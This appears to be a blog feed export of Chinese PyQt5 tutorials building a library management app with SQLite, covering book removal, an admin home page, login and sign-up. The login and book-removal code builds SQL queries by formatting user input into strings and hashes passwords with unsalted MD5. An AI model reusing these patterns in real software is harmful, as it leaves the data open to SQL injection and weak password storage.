self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;删除书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  淘汰书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line">        self.dropNumLabel &#x3D; QLabel(&quot;数    量:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.dropBookButton &#x3D; QPushButton(&quot;淘 汰&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line">        # self.publishDateEdit &#x3D; QLineEdit()</span><br><span class="line">        self.dropNumEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line">        self.dropNumEdit.setMaxLength(12)</span><br><span class="line">        self.dropNumEdit.setValidator(QIntValidator())</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(self.dropNumLabel, self.dropNumEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.dropBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line">        self.dropNumLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.dropNumEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.dropBookButton.setFont(font)</span><br><span class="line">        self.dropBookButton.setFixedHeight(32)</span><br><span class="line">        self.dropBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.dropNumEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 查询对应书号，如果存在就更新form</span><br><span class="line">        if (query.next()):</span><br><span class="line">            self.bookNameEdit.setText(query.value(0))</span><br><span class="line">            self.authNameEdit.setText(query.value(2))</span><br><span class="line">            self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">            self.publisherEdit.setText(query.value(4))</span><br><span class="line">            self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def dropBookButtonClicked(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        dropNum &#x3D; 0</span><br><span class="line">        if (self.dropNumEdit.text() &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;淘汰数目为空，请检查输入，操作失败&quot;), QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">            return</span><br><span class="line">        dropNum &#x3D; int(self.dropNumEdit.text())</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            if (dropNum &gt; query.value(7) or dropNum &lt; 0):</span><br><span class="line">                print(QMessageBox.warning(self, &quot;警告&quot;, &quot;最多可淘汰%d本，请检查输入&quot; % (query.value(7)), QMessageBox.Yes,</span><br><span class="line">                                          QMessageBox.Yes))</span><br><span class="line">                return</span><br><span class="line">        # 更新Book表和BuyorDrop表</span><br><span class="line">        # 如果drop书目和当前库存相同，则直接删除Book记录（这里先默认当前所有书都在库存中）</span><br><span class="line">        if (dropNum &#x3D;&#x3D; query.value(6)):</span><br><span class="line">            sql &#x3D; &quot;DELETE  FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        else:</span><br><span class="line">            sql &#x3D; &quot;UPDATE BOOK SET NumStorage&#x3D;NumStorage-%d,NumCanBorrow&#x3D;NumCanBorrow-%d WHERE BookId&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                dropNum, dropNum, bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;INSERT INTO buyordrop VALUES (&#39;%s&#39;,&#39;%s&#39;,0,%d)&quot; % (bookId, timenow, dropNum)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;淘汰书籍成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.drop_book_successful_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; dropBookDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><p>可以看到里面有两个函数，<code>bookIdEditChanged</code>和<code>dropBookButtonClicked</code></p><p>其中<code>bookIdEditChanged</code>用来实现实时监测是否填充信息<br><code>dropBookButtonClicked</code>实现点击淘汰的逻辑</p><p>当监测到书号的	<code>QLineEdit</code>被更改时触发<code>bookIdEditChanged</code>，从数据库检查是否存在该书，如果有则添加</p><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8vaosh9j308d0bza9z.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8v96qxjj308f0c2aa1.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（4）——管理员主页设计</title>
    <url>/a8b56f4b.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>在管理员主页，为了完成初步的功能，即添加书本，淘汰书本，查看库存，我们需要设计以下：</p><ul><li>一个添加书本的Dialog，通过一个button启用</li><li>一个淘汰书本的Dialog，通过一个button启用</li><li>一个查看库存的Table， 一开始打算用一个button启用的，后来觉得直接放主页也挺好的，所以并没有用button启用（虽然依然放在设计中）</li></ul><a id="more"></a><h2><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from addBookDialog import addBookDialog</span><br><span class="line">from dropBookDialog import dropBookDialog</span><br><span class="line">from BookStorageViewer import BookStorageViewer</span><br><span class="line">from UserManage import UserManage</span><br><span class="line"></span><br><span class="line">class AdminHome(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.layout &#x3D; QHBoxLayout()</span><br><span class="line">        self.buttonlayout &#x3D; QVBoxLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.userManageButton &#x3D; QPushButton(&quot;用户管理&quot;)</span><br><span class="line">        self.addBookButton &#x3D; QPushButton(&quot;添加书籍&quot;)</span><br><span class="line">        self.dropBookButton &#x3D; QPushButton(&quot;淘汰书籍&quot;)</span><br><span class="line">        self.userManageButton.setFont(font)</span><br><span class="line">        self.addBookButton.setFont(font)</span><br><span class="line">        self.dropBookButton.setFont(font)</span><br><span class="line">        self.userManageButton.setFixedWidth(100)</span><br><span class="line">        self.userManageButton.setFixedHeight(42)</span><br><span class="line">        self.addBookButton.setFixedWidth(100)</span><br><span class="line">        self.addBookButton.setFixedHeight(42)</span><br><span class="line">        self.dropBookButton.setFixedWidth(100)</span><br><span class="line">        self.dropBookButton.setFixedHeight(42)</span><br><span class="line">        self.buttonlayout.addWidget(self.addBookButton)</span><br><span class="line">        self.buttonlayout.addWidget(self.dropBookButton)</span><br><span class="line">        self.buttonlayout.addWidget(self.userManageButton)</span><br><span class="line">        self.layout.addLayout(self.buttonlayout)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line"></span><br><span class="line">        self.addBookButton.clicked.connect(self.addBookButtonClicked)</span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.userManageButton.clicked.connect(self.userManage)</span><br><span class="line"></span><br><span class="line">    def addBookButtonClicked(self):</span><br><span class="line">        addDialog &#x3D; addBookDialog(self)</span><br><span class="line">        addDialog.add_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        addDialog.show()</span><br><span class="line">        addDialog.exec_()</span><br><span class="line"></span><br><span class="line">    def dropBookButtonClicked(self):</span><br><span class="line">        dropDialog &#x3D; dropBookDialog(self)</span><br><span class="line">        dropDialog.drop_book_successful_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        dropDialog.show()</span><br><span class="line">        dropDialog.exec_()</span><br><span class="line"></span><br><span class="line">    def userManage(self):</span><br><span class="line">        UserDelete&#x3D;UserManage(self)</span><br><span class="line">        UserDelete.show()</span><br><span class="line">        UserDelete.exec_()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; AdminHome()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><blockquote><p>整段代码非常简短，逻辑也很清晰。<br>1、在setUpUI中有一个淘汰的button，一个添加的button<br>2、使用信号与槽机制，当点击添加按钮时，启用addBookDialog，点击淘汰按钮时，启用dropBookDialog<br>3、主页还有一个BookStorageViewer用于查看库存<br>**注意：**两个diolog和一个Table，我会在接下来的blog中给出</p></blockquote><h2><span id="pxiao-guo">效果</span><a href="#pxiao-guo" class="header-anchor">#</a></h2><p>虽然代码还不全，但也先看看最后效果吧~<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8r2vdvfj30p50hmq3n.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8r260t9j30ot0hlwf8.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（3）——登录页面设计</title>
    <url>/98a38c48.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>登录页面的逻辑很简单，如下：</p><ul><li>用户输入学号和密码（安全起见，加上输入检测）</li><li>如果密码错误或者用户名不存在，则给出提示</li><li>如果正确，则进行跳转</li></ul><a id="more"></a><h2><span id="pdai-ma">代码：</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import hashlib</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SignInWidget(QWidget):</span><br><span class="line">    is_admin_signal &#x3D; pyqtSignal()</span><br><span class="line">    is_student_signal &#x3D; pyqtSignal(str)</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(SignInWidget, self).__init__()</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.Vlayout &#x3D; QVBoxLayout(self)</span><br><span class="line">        self.Hlayout1 &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout2 &#x3D; QHBoxLayout()</span><br><span class="line">        self.formlayout &#x3D; QFormLayout()</span><br><span class="line"></span><br><span class="line">        self.label1 &#x3D; QLabel(&quot;学号: &quot;)</span><br><span class="line">        labelFont &#x3D; QFont()</span><br><span class="line">        labelFont.setPixelSize(18)</span><br><span class="line">        lineEditFont &#x3D; QFont()</span><br><span class="line">        lineEditFont.setPixelSize(16)</span><br><span class="line">        self.label1.setFont(labelFont)</span><br><span class="line">        self.lineEdit1 &#x3D; QLineEdit()</span><br><span class="line">        self.lineEdit1.setFixedHeight(32)</span><br><span class="line">        self.lineEdit1.setFixedWidth(180)</span><br><span class="line">        self.lineEdit1.setFont(lineEditFont)</span><br><span class="line">        self.lineEdit1.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        self.formlayout.addRow(self.label1, self.lineEdit1)</span><br><span class="line"></span><br><span class="line">        self.label2 &#x3D; QLabel(&quot;密码: &quot;)</span><br><span class="line">        self.label2.setFont(labelFont)</span><br><span class="line">        self.lineEdit2 &#x3D; QLineEdit()</span><br><span class="line">        self.lineEdit2.setFixedHeight(32)</span><br><span class="line">        self.lineEdit2.setFixedWidth(180)</span><br><span class="line">        self.lineEdit2.setMaxLength(16)</span><br><span class="line"></span><br><span class="line">        # 设置验证</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.lineEdit1.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.lineEdit2.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        passwordFont &#x3D; QFont()</span><br><span class="line">        passwordFont.setPixelSize(10)</span><br><span class="line">        self.lineEdit2.setFont(passwordFont)</span><br><span class="line"></span><br><span class="line">        self.lineEdit2.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.formlayout.addRow(self.label2, self.lineEdit2)</span><br><span class="line">        self.signIn &#x3D; QPushButton(&quot;登 录&quot;)</span><br><span class="line">        self.signIn.setFixedWidth(80)</span><br><span class="line">        self.signIn.setFixedHeight(30)</span><br><span class="line">        self.signIn.setFont(labelFont)</span><br><span class="line">        self.formlayout.addRow(&quot;&quot;, self.signIn)</span><br><span class="line"></span><br><span class="line">        self.label &#x3D; QLabel(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        fontlabel &#x3D; QFont()</span><br><span class="line">        fontlabel.setPixelSize(30)</span><br><span class="line">        self.label.setFixedWidth(390)</span><br><span class="line">        # self.label.setFixedHeight(80)</span><br><span class="line">        self.label.setFont(fontlabel)</span><br><span class="line">        self.Hlayout1.addWidget(self.label, Qt.AlignCenter)</span><br><span class="line">        self.widget1 &#x3D; QWidget()</span><br><span class="line">        self.widget1.setLayout(self.Hlayout1)</span><br><span class="line">        self.widget2 &#x3D; QWidget()</span><br><span class="line">        self.widget2.setFixedWidth(300)</span><br><span class="line">        self.widget2.setFixedHeight(150)</span><br><span class="line">        self.widget2.setLayout(self.formlayout)</span><br><span class="line">        self.Hlayout2.addWidget(self.widget2, Qt.AlignCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(self.Hlayout2)</span><br><span class="line">        self.Vlayout.addWidget(self.widget1)</span><br><span class="line">        self.Vlayout.addWidget(self.widget, Qt.AlignTop)</span><br><span class="line"></span><br><span class="line">        self.signIn.clicked.connect(self.signInCheck)</span><br><span class="line">        self.lineEdit2.returnPressed.connect(self.signInCheck)</span><br><span class="line">        self.lineEdit1.returnPressed.connect(self.signInCheck)</span><br><span class="line"></span><br><span class="line">    def signInCheck(self):</span><br><span class="line">        studentId &#x3D; self.lineEdit1.text()</span><br><span class="line">        password &#x3D; self.lineEdit2.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;学号和密码不可为空!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库连接</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM user WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;该账号不存在!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        else:</span><br><span class="line">            if (studentId &#x3D;&#x3D; query.value(0) and hl.hexdigest() &#x3D;&#x3D; query.value(2)):</span><br><span class="line">                # 如果是管理员</span><br><span class="line">                if (query.value(3)&#x3D;&#x3D;1):</span><br><span class="line">                    self.is_admin_signal.emit()</span><br><span class="line">                else:</span><br><span class="line">                    self.is_student_signal.emit(studentId)</span><br><span class="line">            else:</span><br><span class="line">                print(QMessageBox.information(self, &quot;提示&quot;, &quot;密码错误!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; SignInWidget()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pxiao-guo-ru-xia">效果如下</span><a href="#pxiao-guo-ru-xia" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8klay6vj311s0j4acf.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8kkcn55j30p70htgm8.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb8kjr1jzj30p00higm6.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（2）——注册页面设计</title>
    <url>/72587310.html</url>
    <content><![CDATA[<blockquote><p>我觉得最cd的就是QtDesigner虽然适合快速开发UI，但是我总用不好，只能纯代码来实现界面了。现在大家能看到的一开始的UI设计和一点逻辑，并不包含总体应用的的逻辑体系</p></blockquote><a id="more"></a><h2><span id="pdai-ma">代码：</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SignUpWidget(QWidget):</span><br><span class="line">    student_signup_signal &#x3D; pyqtSignal(str)</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎登陆图书馆管理系统&quot;)</span><br><span class="line">        self.signUpLabel &#x3D; QLabel(&quot;注   册&quot;)</span><br><span class="line">        self.signUpLabel.setAlignment(Qt.AlignCenter)</span><br><span class="line">        # self.signUpLabel.setFixedWidth(300)</span><br><span class="line">        self.signUpLabel.setFixedHeight(100)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(36)</span><br><span class="line">        lineEditFont &#x3D; QFont()</span><br><span class="line">        lineEditFont.setPixelSize(16)</span><br><span class="line">        self.signUpLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.layout.addWidget(self.signUpLabel, Qt.AlignHCenter)</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        # 表单，包括学号，姓名，密码，确认密码</span><br><span class="line">        self.formlayout &#x3D; QFormLayout()</span><br><span class="line">        font.setPixelSize(18)</span><br><span class="line">        # Row1</span><br><span class="line">        self.studentIdLabel &#x3D; QLabel(&quot;学    号: &quot;)</span><br><span class="line">        self.studentIdLabel.setFont(font)</span><br><span class="line">        self.studentIdLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.studentIdLineEdit.setFixedWidth(180)</span><br><span class="line">        self.studentIdLineEdit.setFixedHeight(32)</span><br><span class="line">        self.studentIdLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.studentIdLineEdit.setMaxLength(10)</span><br><span class="line">        self.formlayout.addRow(self.studentIdLabel, self.studentIdLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row2</span><br><span class="line">        self.studentNameLabel &#x3D; QLabel(&quot;姓    名: &quot;)</span><br><span class="line">        self.studentNameLabel.setFont(font)</span><br><span class="line">        self.studentNameLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.studentNameLineEdit.setFixedHeight(32)</span><br><span class="line">        self.studentNameLineEdit.setFixedWidth(180)</span><br><span class="line">        self.studentNameLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.studentNameLineEdit.setMaxLength(10)</span><br><span class="line">        self.formlayout.addRow(self.studentNameLabel, self.studentNameLineEdit)</span><br><span class="line"></span><br><span class="line">        lineEditFont.setPixelSize(10)</span><br><span class="line"></span><br><span class="line">        # Row3</span><br><span class="line">        self.passwordLabel &#x3D; QLabel(&quot;密    码: &quot;)</span><br><span class="line">        self.passwordLabel.setFont(font)</span><br><span class="line">        self.passwordLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordLineEdit.setFixedWidth(180)</span><br><span class="line">        